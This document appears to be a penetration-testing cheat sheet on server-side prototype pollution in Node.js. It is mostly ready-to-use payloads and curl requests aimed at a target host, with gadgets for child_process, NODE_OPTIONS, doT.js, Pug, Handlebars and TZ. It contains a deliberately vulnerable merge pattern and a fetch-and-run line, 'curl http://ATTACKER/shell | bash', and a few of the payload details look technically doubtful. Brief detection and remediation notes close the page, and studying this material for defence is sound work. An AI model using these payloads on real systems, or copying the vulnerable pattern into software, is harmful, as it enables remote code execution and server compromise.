# Server-Side Prototype Pollution — Node.js RCE

## Summary
In Node.js, prototype pollution can modify properties used by native objects and libraries, potentially leading to remote code execution via `child_process.spawn`, `exec`, or template engines.

## RCE via child_process

### Spawned process options
Node.js `child_process.spawn()`, `exec()`, `fork()` accept an options object. If any default options are polluted before child_process is loaded, arbitrary commands can be injected.

```javascript
// Vulnerable pattern — shallow merge of user input
const merge = require('lodash.merge');
const app = require('express')();

app.post('/config', (req, res) => {
  const config = {};
  merge(config, req.body);  // prototype pollution here
  res.send('ok');
});

// Later, somewhere in the app:
const { exec } = require('child_process');
exec('ls', (err, stdout) => {
  console.log(stdout);
});
```

### Exploitation
```bash
curl -X POST https://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "/proc/self/exe",
      "argv0": "node",
      "NODE_OPTIONS": "--require=/tmp/malicious.js"
    }
  }'
```

## Exploiting child_process.spawn

```javascript
// Spawn reads options.shell (default: false)
// If shell is polluted to "/bin/sh -c ..."
{
  "__proto__": {
    "shell": "/bin/sh",
    "env": {
      "COMMAND": "curl http://ATTACKER/shell | bash"
    }
  }
}
// Then any spawn call adds shell interpretation
```

## Template Engine Gadgets

### Pug / Jade
```javascript
// Pug's compile reads options basedir, filename, etc.
{
  "__proto__": {
    "basedir": "/etc/passwd",
    "filename": "/app/views/index.pug"
  }
}
```

### doT.js
```javascript
// doT's template function reads from Object.prototype
// if Object.prototype has 'varname', it is injected into the compiled function
{
  "__proto__": {
    "varname": "data; return process.mainModule.require('child_process').execSync('id')"
  }
}
```

### Express / Handlebars
```javascript
// HBS partials resolution can read polluted settings
{
  "__proto__": {
    "allowProtoMethodsByDefault": true,
    "allowProtoPropertiesByDefault": true
  }
}
```

## RCE via NODE_OPTIONS

```bash
# Pollute NODE_OPTIONS to load a malicious module at next fork
curl -X POST https://target.com/api/config \
  -d '{"__proto__": {"NODE_OPTIONS": "--require=/tmp/evil.js"}}'

# After this, any child_process.fork() call loads /tmp/evil.js
# Write evil.js:
# require('child_process').execSync('id > /tmp/pwned');
```

## RCE via env.TZ (ICU gadget)

```javascript
// Node.js ICU reads TZ from environment to resolve time zones
// Some versions load arbitrary .so files via TZ
{
  "__proto__": {
    "env": {
      "TZ": ":/tmp/evil.so"
    }
  }
}
```

## Detection — Server Side

```bash
# Basic probe
curl -X POST https://target.com/api/update \
  -d '{"__proto__": {"polluted": "yes"}}'

# Check if pollution persists across requests
curl https://target.com/api/status
# Look for {"polluted":"yes"} in JSON response

# Blind detection via timing
curl -X POST https://target.com/api/update \
  -d '{"__proto__": {"timeout": 10000}}'
# Then make a request that might time out
```

## Remediation
- Never merge user input into global objects
- Use `Object.create(null)` for configuration
- Use `--disallow-code-generation-from-strings` flag
- Sanitise keys with `/^__proto__$/` regex before any merge
- Upgrade Node.js and dependencies to patched versions
- Use a schema validator (Joi, Zod) that strips unknown keys
